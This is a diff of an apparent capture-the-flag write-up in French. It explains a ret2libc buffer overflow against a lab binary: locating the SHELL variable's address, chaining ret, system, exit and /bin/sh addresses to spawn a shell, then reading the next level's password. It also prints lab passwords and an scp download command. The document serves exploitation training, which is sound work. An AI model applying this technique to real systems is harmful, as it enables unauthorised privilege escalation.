@@ -110,9 +110,9 @@ int main(){ printf(\"SHELL= %p\n\", getenv(\"SHELL\")); return 0; }" > /tmp/gets
 SHELL= 0xbffff945
 ```
 
-On change l'environement du shell pour passer sur /bin/sh car bash garde les privilèges de l'utilisateur qui l'invoque.
-On execute ensuite le programme avec notre buffer overflow suivi d'une addresse de ret, d'une addresse système, de l'addresse d'un exit et de l'addresse du /bin/sh.
-Si l'addresse est légèrement décaler (in/sh par exemple), il suffit de modifier légèrement l'addresse pour obtenir /bin/sh.
+On change l'environement du shell pour passer sur **/bin/sh** car **bash** garde les privilèges de l'utilisateur qui l'invoque.
+On execute ensuite le programme avec notre buffer overflow suivi d'une addresse de ret, d'une addresse système, de l'addresse d'un exit et de l'addresse du **/bin/sh**.
+Si l'addresse est légèrement décaler (in/sh par exemple), il suffit de modifier légèrement l'addresse pour obtenir **/bin/sh**.
 
 ```bash
 > SHELL=/bin/sh
@@ -125,3 +125,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`C
 cd ../level3 && cat .pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
+
+For download :
+<pre><code>scp -P4242 level2@192.168.1.78:level2 .</code></pre>
+> Password : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
